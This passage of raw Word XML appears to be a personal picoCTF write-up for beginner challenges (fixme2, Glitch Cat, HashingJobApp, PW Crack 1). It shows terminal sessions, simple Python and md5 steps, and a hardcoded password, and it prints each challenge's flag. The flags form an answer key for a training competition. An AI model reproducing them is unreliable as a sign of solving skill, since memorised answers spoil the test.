        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27B0CEFF" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">caro@ubuntu:~/Downloads$ python3 fixme2.py </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4501DA43" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">  File "fixme2.py", line 22</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="731F1D12" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    if flag = "":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BAB287D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">            ^</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="403CFB15" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">caro@ubuntu:~/Downloads$ nano fixme2.py </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E792CE4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">caro@ubuntu:~/Downloads$ python3 fixme2.py </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09BC25FC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>That is correct! Here's your flag: picoCTF{3qu4l1ty_n0t_4551gnm3nt_f6a5aefc}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1209F177" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22812F8F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Glitch Cat</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="510A45CF" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1224ED45" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DAF2617" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT 'syreal' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="335518C6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62A4244B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Our flag printing service has started glitching! </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>$ nc saturn.picoctf.net 53933</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E112C35" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03D9DABA" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>'picoCTF{gl17ch_m3_n07_' + chr(0x61) + chr(0x34) + chr(0x33) + chr(0x39) + chr(0x32) + chr(0x64) + chr(0x32) + chr(0x65) + '}'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A8D382" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02C6F613" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>caro@ubuntu:~/Downloads$ python3 char.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25DAF432" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>picoCTF{gl17ch_m3_n07_a4392d2e}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BD6EBF8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>caro@ubuntu:~/Downloads$ cat char.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F2776B6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>str ='picoCTF{gl17ch_m3_n07_' + chr(0x61) + chr(0x34) + chr(0x33) + chr(0x39) + chr(0x32) + chr(0x64) + chr(0x32) + chr(0x65) + '}'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08021A5C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>print(str)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53B9E0A9" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>HashingJobApp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CEC97CD" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B88563C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78610F90" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT 'syreal' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E9F0A5D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="765D5FC8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you want to hash with the best, beat this test! </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>nc saturn.picoctf.net 63116</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77307F3A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="HorizontalLine"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A8DD2C7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>caro@ubuntu:~/Downloads$ nc saturn.picoctf.net 63116</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DDBD5C3" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Please md5 hash the text between quotes, excluding the quotes: 'computers'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A47FE5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">Answer: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12CB36CE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>524164822d03894ee68052e183e7ea36</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="190242AC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>524164822d03894ee68052e183e7ea36</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06C47F0E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Correct.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B4AE2E6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Please md5 hash the text between quotes, excluding the quotes: 'a car crash'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42EF6ED7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">Answer: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="767C0D69" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>55067b2a1b8b8110a7411ba64e6f6168</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="101B7726" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>55067b2a1b8b8110a7411ba64e6f6168</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08B6A5FB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Correct.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="620A31FF" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Please md5 hash the text between quotes, excluding the quotes: 'having a baby'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C2CFD19" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">Answer: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24F66C6B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>e215dac50d263755ea60abc80a0f3437</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CAA1186" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>e215dac50d263755ea60abc80a0f3437</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="436F148D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Correct.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17743B05" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>picoCTF{4ppl1c4710n_r3c31v3d_bf2ceb02}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6108E177" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>caro@ubuntu:~$ echo -n having a baby |md5sum |awk '{print $1}'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CBE8A58" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>e215dac50d263755ea60abc80a0f3437</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24CE0BF7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0FADCCD6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>PW Crack 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1997F9DF" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7659A877" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68A0CFDE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT 'syreal' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C53748D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28AB3D8F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Can you crack the password to get the flag? Download the password checker </w:t>
      </w:r>
      <w:hyperlink r:id="rId13" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>here</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and you'll need the encrypted </w:t>
      </w:r>
      <w:hyperlink r:id="rId14" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>flag</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> in the same directory too.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C656600" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>caro@ubuntu:~/Downloads$ cat level1.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6906D9AD" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ########################</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46D9AD38" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>def str_xor(secret, key):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D72259" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    #extend key to secret length</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="034D847B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    new_key = key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FE0157C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    i = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62A515BB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    while len(new_key) &lt; len(secret):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="723F960D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">        new_key = new_key + key[i]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C6C58E0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">        i = (i + 1) % len(key)        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="339A4F6F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41E628CB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>###############################################################################</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35B7DAEC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69566E24" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33CC5630" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>flag_enc = open('level1.flag.txt.enc', 'rb').read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4113339F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18B03FD8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C8DF638" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D2B9764" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>def level_1_pw_check():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C5B9105" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>user_pw = input("Please enter correct password for flag: ")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FD767C6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">    if( user_pw == </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>"691d"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="26"/>
